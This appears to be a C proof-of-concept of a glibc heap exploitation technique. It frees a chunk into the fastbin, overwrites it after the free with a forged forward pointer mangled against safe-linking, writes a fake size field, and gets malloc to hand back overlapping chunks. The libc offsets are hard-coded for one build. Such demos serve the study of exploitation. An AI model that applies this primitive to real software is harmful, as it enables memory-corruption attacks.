#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>

size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x79e60;
    size_t* mp_72=libc_addr+0x1f23c0;
    size_t heap=*mp_72;
    return heap;
}

int main()
{    
    size_t chunkarray[0x10];
    size_t heap=getheap();
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x40);
    }
    size_t* chunk1=malloc(0x40);
    for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }
    free(chunk1);
    chunk1[0]=(size_t)(chunk1+2)^(heap>>12); //fd to fake chunk
    chunk1[3]=0x51;    // fake chunk size
    chunk1[4]=heap>>12;  // will fastbin into tcache so fake fd is 0^ heap>>12
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x40);
    }
    size_t*chunk2=malloc(0x40);
    size_t*chunk3=malloc(0x40);
    printf("chunk3 data begin %p \n",chunk3);
    printf("chunk3 data end %p \n",chunk3+8);
    printf("chunk1 data begin %p \n",chunk1);
    printf("chunk1 data end %p \n",chunk1+8);

}